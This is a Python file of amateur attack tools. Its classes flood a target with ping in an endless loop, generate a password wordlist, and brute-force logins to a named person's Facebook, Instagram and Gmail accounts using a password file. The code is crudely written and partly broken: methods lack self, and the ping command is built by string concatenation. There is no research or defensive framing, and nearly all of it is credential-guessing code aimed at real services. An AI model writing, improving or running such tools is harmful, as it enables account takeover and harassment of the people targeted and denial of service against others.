class DDos():
	def DDos(target):
		import os
		
		while True:
			os.system("ping " + target)

class passmaker():
	def passmaker(fname,acceptcharests,minlen,maxlen,wrbasic):
		if acceptcharests == "0":
			acceptcharests = "1234567890"
		elif acceptcharests == "1":
			acceptcharests = "qwertyuiopasdfghjklzxcvbnm_-/*"
		elif acceptcharests == "2":
			acceptcharests = "1234567890qwertyuiopasdfghjklzxcvbnm_-/*"
		else: 
			pass
		basic = """
	
		"""
		import random
		import os
		f = open(fname,"w")
		if wrbasic:
			f.write(basic)
		x = 0
		while x < 10000000:
			os.system("clear")
			os.system("cls")
			print(str(float(x/100000))+"%")
			len = random.randrange(minlen,maxlen)
			for i in range(len):
				r = random.choice(acceptcharests)
				f.write(r)
			
			f.write("\n")
			x += 1
		f.close()
class Facebook():
	def Facebook(target,passfile):
		import os
		try:
			import mechanize
		except:
			print("you have to download mechanize library")
		browser = mechanize.Browser()
		browser.set_handle_robots(False)
		browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7')]
		browser.set_handle_refresh(False)

		url = 'http://www.facebook.com/login.php'
		c = 0
		f = open(passfile,'r')
		fr = f.readlines()
		kk = 0
		while kk < 10000000:
			os.system("clear")
			os.system("cls")
			print(str(float(kk/100000))+"%")
			kk += 1
			pw = fr[c].replace('\n','').replace(' ','')
			c+=1
			browser.open(url)
			browser.select_form(nr = 0)       			#This is login-password form -> nr = number = 0
			browser.form['email'] = target
			browser.form['pass'] = str(pw)
			response = browser.submit()
			if 'welcome' in browser.geturl():
				print(str(pw) + ' Found!\n\n')
				print(browser.geturl())
				break
			else:
				print(str(pw) + ' NotFound\n\n')
				print(browser.geturl())
class Insta():
	def Insta(target,passfile):
		try:
			from instabot import Bot
		except:
			print("you have to download instabot library")
		import os
		f = open(passfile,"r").readlines()
		x = 0
		bot = Bot()
		while x < 10000000:
			os.system("clear")
			print(str(float(x))+"%")
			try:
				bot.login(target,f[x].split())
				print("Found: "+str(f[x]))
				break
			except:
				print("scanning")
			x += 1
			
class Email():
	def Email(target,passf):
		try:
			import smtplib
		except: print("you have to dwonload smtplib library")
		#smtpServer
		smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
		smtpserver.ehlo()
		smtpserver.starttls()

		#Target Email & Password File
		user = target
		passfile = passf
		passfile = open (passfile, "r")
		x = 0
		import os
		for password in passfile.readlines() :

			try : 
				smtpserver.login(user, password)
				print("+++ Password found  : ", password ) 
				break
			except smtplib.SMTPAuthenticationError:
				print ("scanning...,")
			os.system("clear")
			os.system("cls")
			
			print(str(x/1000000) + "%")
			x += 1
